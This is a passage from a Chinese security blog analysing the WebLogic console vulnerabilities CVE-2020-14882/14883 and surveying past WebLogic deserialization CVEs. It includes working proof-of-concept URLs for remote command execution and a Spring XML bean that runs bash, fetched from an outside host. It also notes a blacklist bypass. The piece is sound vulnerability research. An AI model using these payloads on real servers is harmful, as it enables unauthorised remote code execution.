<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112163613908.png" alt="image-20211112163613908"></p>
<p>持续跟进到调用到<code>doGet()</code>函数，然后最终调用的是<code>doPost()</code>函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112164009192.png" alt="image-20211112164009192"></p>
<p>这里会调用<code>createUIContext()</code>函数来获取对应的<code>jspContext</code></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112225315294.png" alt="image-20211112225315294"></p>
<p>调用<code>getTree()</code>返回控件树</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112225810102.png" alt="image-20211112225810102"></p>
<p>但是在调用<code>getTree()</code>函数时又对<code>pattern</code>进行了一次url解码，这里就是目录穿越的核心</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112230235971.png" alt="image-20211112230235971"></p>
<p><code>processStream()</code>函数内部使用<code>getMergedControlFromFile()</code>函数从<code>file</code>（即上面<code>pattern</code>）文件中来获取对应的UI控件</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112231103897.png" alt="image-20211112231103897"></p>
<p>调用<code>getControlFactoryFromFile()</code>函数来读取xml文件<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116182041346.png" alt="image-20211116182041346"></p>
<p>最后通过<code>getControlFactoryFromFileWithoutCaching()</code>获取文件内容，即本次目录穿越漏洞的<strong>Sink</strong></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116182239347.png" alt="image-20211116182239347"></p>
<p><strong>patch</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] IllegalUrl = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;;&quot;</span>, <span class="string">&quot;%252E%252E&quot;</span>, <span class="string">&quot;%2E%2E&quot;</span>, <span class="string">&quot;..&quot;</span>, <span class="string">&quot;%3C&quot;</span>, <span class="string">&quot;%3E&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>对路径进行校验，但是可以用小写url绕过</p>
<h4 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h4><p><strong>poc</strong></p>
<ol>
<li><code>ShellSession</code>命令执行（Weblogic 10.3.6无此类）</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/success1&#x27;);&quot;)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><code>FileSystemXmlApplicationContext</code>命令执行</li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[touch /tmp/success2]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://172.28.164.182:9000/evil.xml&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>继续回到<code>createUIContext()</code>，我们跟进一下<code>setServletRequest()</code>函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116183939028.png" alt="image-20211116183939028"></p>
<p>当传入的<code>_nfpb</code>参数为<code>true</code>时，就会把<code>isPostback</code>设置为<code>true</code></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116184255406.png" alt="image-20211116184255406"></p>
<p>在创建完控件上下文之后调用<code>runLifecycle()</code>函数进入控件的生命周期</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112230430470.png" alt="image-20211112230430470" style="zoom:80%;" />

<p>当<code>isOutBound</code>为<code>false</code>（默认）和<code>isPostback</code>为<code>true</code>时，就会调用<code>runInbound()</code>函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116184719698.png" alt="image-20211116184719698"></p>
<p>在<code>runInbound()</code>函数中会把<code>_inboundLifecycle</code>赋给<code>VisitorType</code>，每个<code>VisitorType</code>对应着该生命周期中的一个控件操作，其中<code>_inboundLifecycle</code>的第一个控件操作为<code>UIControl.init</code></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116185044545.png" alt="image-20211116185044545"></p>
<blockquote>
<p>题外，其实这里的<code>_nfpb=true</code>并不是必须的，因为我们的核心是调用到<code>UIControl.init</code>控件操作，而<code>_outboundLifecycle</code>实际也有这个操作</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116192941383.png" alt="image-20211116192941383" style="zoom:80%;" />
</blockquote>
<p>调用<code>walk()</code>来遍历<code>console.portal</code>文件中的控件节点并对其执行<code>VisitorType</code>中对应的操作</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116185335651.png" alt="image-20211116185335651"></p>
<p>跟进<code>walkRecursive()</code>函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112160156084.png" alt="image-20211112160156084"></p>
<p>当遍历指针<code>visit</code>识别到有节点时就会调用<code>visit()</code>函数执行对应的控件操作</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116190638412.png" alt="image-20211116190638412"></p>
<p>而这里就是对控件进行初始化</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116191217581.png" alt="image-20211116191217581"></p>
<p>如果该节点具有子节点就继续调用<code>walkRecursive()</code>函数对子节点进行遍历</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116185825460.png" alt="image-20211116185825460"></p>
<p>遍历方向如下图所示</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116191101845.png" alt="image-20211116191101845"></p>
<p>在识别到<code>/PortalConfig/contentheader/ContentHeader_breadcrumbs.portlet</code>节点时，程序会调用<code>Portlet</code>类父类的初始化函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113011922491.png" alt="image-20211113011922491"></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113011937480.png" alt="image-20211113011937480"></p>
<p>其中<code>Portlet</code>类的继承链和<code>init()</code>操作如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Portlet</span> <span class="keyword">extends</span> <span class="title class_">class</span> Window</span><br><span class="line">	<span class="built_in">super</span>.init()</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Window</span> <span class="keyword">extends</span> <span class="title class_">class</span> EntitledUIControl</span><br><span class="line">	<span class="built_in">super</span>.init()</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EntitledUIControl</span> <span class="keyword">extends</span> <span class="title class_">class</span> AdministeredBackableControl</span><br><span class="line">	<span class="title function_">init</span><span class="params">()</span> &lt;== not exists</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdministeredBackableControl</span></span><br><span class="line">	init()</span><br></pre></td></tr></table></figure>

<p>所以它最终会调用到<code>AdministeredBackableControl</code>的<code>init()</code>函数进行初始化</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112160001615.png" alt="image-20211112160001615" style="zoom:80%;" />

<p><code>netuix_servlet.jar!\com\bea\netuix\servlets\controls\Backable.class#initializeBackingFile</code></p>
<p>继续跟进它的<code>init()</code>函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112155932230.png" alt="image-20211112155932230"></p>
<p>这里是获取了我们传入的<code>handle</code>参数</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112155806888.png" alt="image-20211112155806888" style="zoom:80%;" />

<p>然后程序就可以初始化任意<code>handle</code>类</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113002831750.png" alt="image-20211113002831750"></p>
<p>其中<code>ShellSession</code>类的调用栈如下</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113002623429.png" alt="image-20211113002623429" style="zoom:80%;" />

<p>其中<code>FileSystemXmlApplicationContext</code>类的调用栈如下</p>
<p>下载xml文件</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113015257300.png" alt="image-20211113015257300" style="zoom:80%;" />

<p>解析xml文件</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113015841997.png" alt="image-20211113015841997" style="zoom:80%;" />

<p><strong>patch</strong></p>
<ol>
<li><p>官方对CVE-2020-14883的补丁是在com\bea\console\handles\HandleFactory#getHandle的方法中对传入的类的类型进行检查，是否为handle的子类。这里通过handle实现类<code>com.bea.console.handles.HandleImpl</code>的子类<code>com.bea.console.handles.JndiBindingHandle</code>的接收String的构造方法将jndi的url作为payload传入；单独这一点并不能实现RCE（之前虽然知道补丁的修复方式但是觉得单独这个无法RCE就没细看，谁知道可以结合其他点来实现RCE）。 </p>
</li>
<li><p>在com.bea.console.actions.jndi.JNDIBindingAction#execute方法中，构造了JndiBindingHandle对象，并通过获取jndi的payload，并进行了特定的拼接（这里根据其拼接方式进行特殊构造），调用javax.naming.Context#lookup实现了jndi注入导致的RCE。</p>
</li>
</ol>
<h2 id="回显构造"><a href="#回显构造" class="headerlink" title="回显构造"></a>回显构造</h2><p>具体参考一下@Y4er师傅的<a target="_blank" rel="noopener" href="https://y4er.com/post/java-deserialization-echo/">文章</a></p>
<ol>
<li>defineClass</li>
<li>RMI绑定实例</li>
<li>URLClassLoader抛出异常</li>
<li>中间件</li>
<li>写文件css、js</li>
<li>dnslog</li>
</ol>
<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><ol>
<li>只有实现了Serializable接口或Externalizable接口的类才能进行序列化</li>
<li>被transient和static修饰的变量不参与修饰符，其值为null</li>
<li>readResolve()方法如果被定义会在readObject()方法后被调用，修改反序列化的对象</li>
<li>Externalizable接口定义了writeExternal()和readExternal()方法，对应Serializable接口的writeObject()和readObject()方法</li>
<li>历史漏洞梳理，大部分新漏洞的造成都是对黑名单的绕过：<ul>
<li>CVE-2015-4852、CVE2016-0638、CVE-2016-3510、CVE-2019-2890都是直接搜索能对ObjectInputStream直接进行操作的readObject()或者readExternal()方法</li>
<li>CVE-2017-3248、CVE-2018-2628、CVE-2018-2893、CVE-2018-3245主要在RMI的前提下不断搜索RemoteObject相似子类来绕过，或者是直接绕过resolveProxyClass()的检查</li>
<li>CVE-2020-2551运用T3协议和IIOP协议之间的差异进行绕过，关键的地方就是T3的resolveClass()方法会检查其父类，而IIOP的resolveClass()只会检查其本身类</li>
<li>CVE-2020-2555、CVE-2020-2883、CVE-2020-14645挖掘出了一条新的extractor反射链并不断搜索能够调用此方法的相似类进行绕过</li>
<li>CVE-2020-14644通过defineClass()来加载我们的恶意类，这是一个很巧妙的思路</li>
<li>CVE-2017-3506、CVE-2017-10271、CVE-2019-2725、CVE-2019-2729是根据对标签的差异解析进行绕过，这需要对源码进行深入解读才可以</li>
</ul>
</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/TheTh1nk3r/articles/14506947.html">java反序列化漏洞（1）之反射机制</a></p>
<p><a target="_blank" rel="noopener" href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">Java反序列 Jdk7u21 Payload 学习笔记</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1516342">Weblogic反序列化历史漏洞全汇总</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219985">CVE-2015-4852——WebLogic反序列化初探</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8443">从Weblogic原理上探究CVE-2015-4852、CVE-2016-0638、CVE-2016-3510究竟怎么一回事</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/203816.html">CVE-2017–10271漏洞原理分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/afanti/p/10222293.html">weblogic远程调试XMLDecoder RCE CVE-2017-10271</a></p>
<p><a target="_blank" rel="noopener" href="http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/">CVE-2019-2725分析</a></p>
<p><a target="_blank" rel="noopener" href="http://galaxylab.pingan.com.cn/weblogic-cve-2019-2725%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">WebLogic | CVE-2019-2725反序列化漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225137#h3-5">CVE-2017-3248——WebLogic反序列化初探</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8073">CVE-2018-2628 Weblogic反序列化漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/152164">CVE-2018-2893：Oracle WebLogic Server 远程代码执行漏洞分析预警</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2479">Weblogic JRMP反序列化漏洞回顾</a></p>
<p><a target="_blank" rel="noopener" href="https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2019-2729 WEBLOGIC XMLDECODER反序列化漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6904">Weblogic-T3-CVE-2019-2890-Analysis</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1321/#cve-2020-2555">Weblogic12c T3 协议安全漫谈</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213074">Weblogic 远程命令执行漏洞（CVE-2020-14644）分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213248">Weblogic 远程命令执行漏洞（CVE-2020-14645）分析</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7422">CVE-2020-2551: Weblogic IIOP反序列化漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/221752">CVE-2020-14882：Weblogic Console 权限绕过深入解析</a></p>
<p><a target="_blank" rel="noopener" href="https://f5.pm/go-60295.html">Weblogic Console漏洞分析</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2021/02/02/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">https://tyaoo.github.io/2021/02/02/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WebLogic/">WebLogic</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/17/nonce-strict-dynamic-bypass/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CSP nonce&amp;strict-dynamic Bypass</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/17/Vulnstack-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Vulnstack 红队实战</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">36</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">相关协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6"><span class="toc-number">3.</span> <span class="toc-text">反射机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">动态代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ysoserial"><span class="toc-number">5.</span> <span class="toc-text">ysoserial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">6.</span> <span class="toc-text">TemplatesImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#javassist"><span class="toc-number">6.1.</span> <span class="toc-text">javassist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">6.2.</span> <span class="toc-text">调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">6.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">7.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic-10-3-6-0"><span class="toc-number">7.1.</span> <span class="toc-text">weblogic: 10.3.6.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic-12-2-1-4"><span class="toc-number">7.2.</span> <span class="toc-text">weblogic: 12.2.1.4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">8.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">8.1.</span> <span class="toc-text">JAVA反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-number">8.1.1.</span> <span class="toc-text">CVE-2015-4852</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-number">8.1.2.</span> <span class="toc-text">CVE-2016-0638</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-3510"><span class="toc-number">8.1.3.</span> <span class="toc-text">CVE-2016-3510</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-3248"><span class="toc-number">8.1.4.</span> <span class="toc-text">CVE-2017-3248</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-2628"><span class="toc-number">8.1.5.</span> <span class="toc-text">CVE-2018-2628</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-2893"><span class="toc-number">8.1.6.</span> <span class="toc-text">CVE-2018-2893</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-3245"><span class="toc-number">8.1.7.</span> <span class="toc-text">CVE-2018-3245</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-2890"><span class="toc-number">8.1.8.</span> <span class="toc-text">CVE-2019-2890</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-2551"><span class="toc-number">8.1.9.</span> <span class="toc-text">CVE-2020-2551</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-2555"><span class="toc-number">8.1.10.</span> <span class="toc-text">CVE-2020-2555</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-2883"><span class="toc-number">8.1.11.</span> <span class="toc-text">CVE-2020-2883</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-14644"><span class="toc-number">8.1.12.</span> <span class="toc-text">CVE-2020-14644</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-14645"><span class="toc-number">8.1.13.</span> <span class="toc-text">CVE-2020-14645</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">8.2.</span> <span class="toc-text">XML反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-3506"><span class="toc-number">8.2.1.</span> <span class="toc-text">CVE-2017-3506</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-10271"><span class="toc-number">8.2.2.</span> <span class="toc-text">CVE-2017-10271</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-2725"><span class="toc-number">8.2.3.</span> <span class="toc-text">CVE-2019-2725</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-2729"><span class="toc-number">8.2.4.</span> <span class="toc-text">CVE-2019-2729</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-14882"><span class="toc-number">8.2.5.</span> <span class="toc-text">*CVE-2020-14882</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-14883"><span class="toc-number">8.2.6.</span> <span class="toc-text">CVE-2020-14883</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0"><span class="toc-number">9.</span> <span class="toc-text">回显构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">思考总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">11.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>